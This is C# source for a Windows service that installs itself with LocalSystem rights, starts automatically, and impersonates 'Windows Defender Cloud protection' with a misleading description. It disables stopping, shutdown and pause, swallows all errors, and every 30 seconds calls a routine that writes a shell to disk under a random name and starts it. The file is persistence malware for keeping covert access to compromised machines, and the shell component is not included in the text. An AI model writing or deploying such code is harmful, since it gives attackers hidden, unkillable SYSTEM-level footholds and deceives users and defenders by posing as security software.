using System;
using System.Configuration.Install;
using System.Reflection;
using System.ServiceProcess;
using System.ComponentModel;
using System.Timers;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace ShellManagerService
{
    class Program : ServiceBase
    {
        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += CurrentDomainUnhandledException;
            if (Environment.UserInteractive)
            {
                //if run interactively, just try to uninstall/reinstall any previous versions of the service
                try
                {
                    ManagedInstallerClass.InstallHelper(new string[] { "/u", Assembly.GetExecutingAssembly().Location });
                }
                catch { }
                ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
            }
            else
            {
                //we are running in the service context, so start the service
                Run(new Program());
            }
        }

        private static void CurrentDomainUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            //Eat this exception
            //((Exception)e.ExceptionObject).Message + ((Exception)e.ExceptionObject).InnerException.Message);
        }

        private void DoNotStopTheRock()
        {
            CanStop = false;
            CanShutdown = false;
            CanPauseAndContinue = false;
            CanHandlePowerEvent = false;
        }

        public Program()
        {
            ServiceName = "WinDefendCloudService";
            DoNotStopTheRock();
        }

        protected override void OnStart(string[] args)
        {
            var timer = new Timer();
            timer.Interval = 30000; //30 seconds
            timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
            timer.Enabled = true;
            base.OnStart(args);
        }

        private void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            //Will attempt to load shell in disk and start it, only if necessary, by giving it a random ass name
            ShellManager.LoadShellInDisk();
        }

        protected override void OnStop()
        {
            base.OnStop();
        }
    }

    [RunInstaller(true)]
    public class MyWindowsServiceInstaller : Installer
    {
        public MyWindowsServiceInstaller()
        {
            var processInstaller = new ServiceProcessInstaller();
            var serviceInstaller = new ServiceInstaller();
            serviceInstaller.DisplayName = "Windows Defender Cloud protection";
            serviceInstaller.Description = "Windows Defender Cloud protection service. Handles communications to Microsoft services. Any interruption could lead to unexpected behaviour.";
            serviceInstaller.ServiceName = "WinDefendCloudService";
            serviceInstaller.StartType = ServiceStartMode.Automatic;
            processInstaller.Account = ServiceAccount.LocalSystem;
            Installers.Add(processInstaller);
            Installers.Add(serviceInstaller);
            serviceInstaller.AfterInstall += ServiceInstaller_AfterInstall;
        }

        void ServiceInstaller_AfterInstall(object sender, InstallEventArgs e)
        {
            foreach (var svc in ServiceController.GetServices())
            {
                if (svc.ServiceName == "WinDefendCloudService")
                {
                    Console.WriteLine("[*] Found service installed: {0}", svc.DisplayName);
                    Console.WriteLine("[*] Starting service ...");
                    svc.Start();
                }
            }
        }
    }
}
